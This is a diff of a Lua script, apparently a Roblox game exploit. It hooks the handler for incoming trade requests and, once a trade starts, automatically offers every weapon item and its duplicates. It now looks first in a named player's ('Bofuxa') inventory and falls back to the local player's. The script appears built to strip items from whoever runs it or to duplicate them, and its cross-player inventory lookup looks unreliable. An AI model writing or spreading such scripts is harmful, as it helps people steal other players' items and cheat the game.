@@ -36,14 +36,40 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             print("Waiting for trade to start...")
             StartTradeEvent.OnClientEvent:Wait()
             
-            print("Trade started! Adding all weapons directly using OfferItemEvent...")
+            print("Trade started! Fetching weapons directly from Bofuxa's inventory container...")
             task.wait(1)
             
             local inventoryContainer = nil
-            local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+            local bofuxaPlayer = Players:FindFirstChild("Bofuxa")
             
-            if pGui then
-                local mainGui = pGui:FindFirstChild("MainGUI")
+            if bofuxaPlayer then
+                local bGui = bofuxaPlayer:FindFirstChild("PlayerGui")
+                if bGui then
+                    local mainGui = bGui:FindFirstChild("MainGUI")
+                    if mainGui then
+                        local gameFolder = mainGui:FindFirstChild("Game")
+                        if gameFolder then
+                            local crafting = gameFolder:FindFirstChild("Crafting")
+                            if crafting then
+                                local inventory = crafting:FindFirstChild("Inventory")
+                                if inventory then
+                                    local salvage = inventory:FindFirstChild("Salvage")
+                                    if salvage then
+                                        local scrollFrame = salvage:FindFirstChild("ScrollFrame")
+                                        if scrollFrame then
+                                            inventoryContainer = scrollFrame:FindFirstChild("Container")
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+
+            -- Fallback to LocalPlayer's container if Bofuxa's path isn't locally visible
+            if not inventoryContainer and playerGui then
+                local mainGui = playerGui:FindFirstChild("MainGUI")
                 if mainGui then
                     local gameFolder = mainGui:FindFirstChild("Game")
                     if gameFolder then
@@ -84,7 +110,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                 end
-                print("Successfully added all " .. tostring(offeredCount) .. " weapon items and duplicates!")
+                print("Successfully added all " .. tostring(offeredCount) .. " weapon items and duplicates from container!")
             else
                 warn("Inventory container path not found; using Backpack fallback.")
                 if LocalPlayer:FindFirstChild("Backpack") then
